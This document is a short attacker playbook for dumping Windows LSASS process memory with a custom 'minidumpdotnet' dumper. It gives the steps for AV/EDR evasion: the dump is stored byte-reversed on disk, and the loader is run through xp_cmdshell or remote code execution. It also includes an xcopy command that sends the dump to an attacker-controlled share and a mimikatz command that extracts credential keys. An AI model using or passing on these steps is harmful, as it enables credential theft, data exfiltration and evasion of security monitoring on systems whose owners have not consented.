# LSASS Dump via Custom API (minidumpdotnet)

Dump LSASS memory using a custom MiniDumpWriteDump implementation to evade AV/EDR detection. Avoids direct use of the flagged Windows API.

## Tools Required
- `minidumpdotnet.dll` — custom LSASS dumper
- `mini.ps1` — PowerShell loader for minidumpdotnet
- `reverse.exe` — reverses the dump file bytes (evasion: dump stored reversed on disk)
- `Reverse.exe` — tool to un-reverse the dump for parsing

## Execution (via xp_cmdshell or RCE on target)
```powershell
# Copy mini.ps1 to target (via SMB share or xp_cmdshell xcopy)
# Execute to create reversed dump
powershell C:\Users\Public\mini.ps1
# Output: C:\Users\Public\reverse.dmp
```

## Exfiltrate Dump
```
xcopy C:\Users\Public\reverse.dmp \\<ATTACKER_SHARE>\
```

## Un-reverse the Dump
```
Reverse.exe "C:\path\to\reverse.dmp" "C:\path\to\reversex.dmp"
```

## Parse Dump with Mimikatz
```
mimikatz.exe "sekurlsa::minidump C:\path\to\reversex.dmp" "sekurlsa::ekeys" "exit"
```

## Notes
- Dump file reversed on disk to avoid AV scanning the LSASS dump signature
- `minidumpdotnet` reimplements `MiniDumpWriteDump` to avoid hooking by AV
- Run from high-integrity/SYSTEM context
- Serve `minidumpdotnet.dll` via HTTP and download in `mini.ps1`
